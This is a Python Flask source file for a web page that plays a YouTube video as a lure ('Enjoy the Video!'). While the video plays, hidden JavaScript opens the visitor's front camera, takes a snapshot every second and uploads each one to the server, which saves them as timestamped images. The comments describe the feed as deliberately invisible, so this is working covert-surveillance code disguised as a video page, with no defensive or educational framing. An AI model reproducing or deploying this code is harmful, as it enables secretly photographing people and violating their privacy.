from flask import Flask, request, render_template_string
import os
from datetime import datetime
import base64

app = Flask(__name__)

# Directory to save captured images
SAVE_DIR = "captured_images"
os.makedirs(SAVE_DIR, exist_ok=True)

# HTML + JavaScript code with YouTube video integration (no camera preview)
HTML_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Invisible Camera Capture with YouTube Video</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            font-family: Arial, sans-serif;
        }
        iframe {
            border: none;
        }
        canvas {
            display: none; /* Hide the canvas to make the camera feed invisible */
        }
    </style>
</head>
<body>
    <h1>Enjoy the Video!</h1>

    <!-- YouTube Video Player -->
    <iframe width="560" height="315" 
            src="https://m.youtube.com/watch?v=wna4Xly9Ld0&pp=ygUPQ2FuZHlzaG9wIGNvdmVy" 
            title="YouTube video player" 
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
            allowfullscreen>
    </iframe>

    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const canvas = document.getElementById('canvas');
        const context = canvas.getContext('2d');

        // Access the front camera
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                const video = document.createElement('video'); // Create hidden video element
                video.srcObject = stream;
                video.play();

                // Capture a picture every 1 second
                setInterval(() => {
                    context.save();
                    context.scale(-1, 1); // Flip the image back to normal
                    context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
                    context.restore();

                    const imageData = canvas.toDataURL('image/png');

                    // Send image to the backend
                    fetch('/upload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ image: imageData })
                    })
                    .then(response => response.text())
                    .then(data => console.log(data))
                    .catch(err => console.error("Error uploading image:", err));
                }, 1000); // Capture every 1 second
            })
            .catch(err => console.error("Error accessing camera:", err));
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Serve the HTML page."""
    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    """Receive and save the captured image."""
    data = request.json['image']
    # Remove the data URL prefix to get the image bytes
    image_data = base64.b64decode(data.split(',')[1])

    # Save the image with a timestamped filename
    filename = f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    filepath = os.path.join(SAVE_DIR, filename)
    with open(filepath, 'wb') as f:
        f.write(image_data)

    print(f"Image saved: {filepath}")  # Print the image path to terminal
    return f"Image saved: {filename}"

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5050)
